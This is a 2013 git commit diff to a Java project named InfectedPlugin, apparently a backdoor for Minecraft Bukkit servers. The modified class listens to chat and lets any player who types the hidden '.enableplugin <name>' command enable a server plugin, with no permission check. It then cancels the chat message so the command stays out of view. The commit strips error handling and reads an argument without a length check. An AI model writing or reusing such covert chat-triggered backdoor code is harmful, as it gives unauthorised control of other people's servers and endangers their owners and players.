8dfb43441102f8df306f76f1e1e66f67495b4b0d
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-29 18:58:44 -0700

    hi

--- src/org/CreeperCoders/InfectedPlugin/Commands/Command_enableplugin.java
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_enableplugin.java
@@ -1,22 +1,19 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
-import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.plugin.PluginManager;
 
-public class Command_enableplugin extends IP_Command implements Listener
+public class Command_enableplugin implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         boolean cancel = false;
-        Server server = Bukkit.getServer();
         Player p = event.getPlayer();
         
         if (message.startsWith("."))
@@ -29,28 +26,11 @@ public class Command_enableplugin extends IP_Command implements Listener
 
             if (args[0].equalsIgnoreCase(".enableplugin"))
             {
-                if (args.length == 0)
+                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
+                if (plugin != null)
                 {
-                    p.sendMessage(ChatColor.RED + "Usage: .enableplugin <plugin>");
+                    Bukkit.getPluginManager().enablePlugin(plugin);
                 }
-
-                Plugin pl;
-                try
-                {
-                    pl = getPlugin(args[0]);
-                }
-                catch (PluginNotFoundException ex)
-                {
-                    p.sendMessage(ChatColor.RED + ex.getMessage());
-                    return;
-                }
-                
-                if (pl != null)
-                {
-                    PluginManager pluginManager = pl.getServer().getPluginManager();
-                    pluginManager.enablePlugin(pl);
-                }
-                p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                 cancel = true;
             }
         
